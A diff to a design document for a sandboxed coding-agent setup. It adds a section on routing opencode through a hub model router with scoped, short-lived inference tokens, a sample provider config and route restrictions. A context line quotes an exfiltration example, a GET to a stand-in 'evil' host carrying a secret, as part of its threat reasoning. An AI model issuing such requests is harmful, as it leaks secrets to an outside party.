@@ -381,6 +381,60 @@ axis, because `GET https://evil/?x=<secret>` is exfiltration with a GET.
 
 ## Coding-agent CLIs in the sandbox
 
+### opencode through the hub model router
+
+MAC's coding CLI is opencode. `MAC_CODING_AGENT` unset selects it;
+`MAC_CODING_AGENT=auto` restores the multi-CLI selection described below until
+those detectors are removed. opencode gets its model from the hub's
+OpenAI-compatible router (`$MAC_HUB_URL/v1`), which fails over across the
+providers in `MAC_ROUTER_PROVIDERS`.
+
+The worker token never enters the sandbox: it can claim tasks and write the
+ledger. Instead, for each task:
+
+1. The executor, on the host, calls `POST /agents/{agent_id}/inference-tokens`
+   with the worker token. The hub returns a token bound to that agent with only
+   the `inference` scope. It lives 6 hours and is revoked when the task ends.
+   The hub keeps only its sha256 hash, in `inference_tokens`.
+2. The sandbox receives it as `MAC_INFERENCE_TOKEN`, with `MAC_HUB_URL` as the
+   sandbox sees it (a loopback hub becomes `host.openshell.internal`).
+3. The executor writes `.mac-opencode.json` into the uploaded workspace and
+   points `OPENCODE_CONFIG` at it. Its only provider is `machub`:
+
+   ```json
+   {
+     "model": "machub/gpt-5.6-sol",
+     "autoupdate": false,
+     "provider": {
+       "machub": {
+         "npm": "@ai-sdk/openai-compatible",
+         "options": {
+           "baseURL": "http://<hub>:<port>/v1",
+           "apiKey": "{env:MAC_INFERENCE_TOKEN}",
+           "headers": {"X-MAC-Task-ID": "<task id>"}
+         },
+         "models": {"gpt-5.6-sol": {"tool_call": true}}
+       }
+     }
+   }
+   ```
+
+4. opencode runs as `opencode run --auto --model machub/<model>`. The model is
+   `MAC_TASK_MODEL`, else `MAC_CODING_DEFAULT_MODEL`, else `gpt-5.6-sol`.
+   `MAC_CODING_MODELS` lists the models the config declares.
+
+An `inference` token may call `POST /v1/chat/completions` and
+`POST /v1/embeddings` and gets 403 everywhere else. The router attributes each
+call to the token's agent. Agent credentials keep reaching all of `/v1`. The
+policy's `opencode_router` block holds the opencode binaries to the same two
+routes on the hub host and port.
+
+The in-sandbox preflight mints a 15-minute token of its own and revokes it
+after the probe. Each logical model name must be one the hub's
+`MAC_ROUTER_PROVIDERS` aliases for every provider in its failover order.
+
+### Other coding CLIs
+
 The executor prefers an installed, authenticated coding-agent CLI (Claude Code,
 Codex, Cursor) over a direct LLM-gateway run, because those CLIs authenticate
 against a subscription/seat instead of a metered API token (see
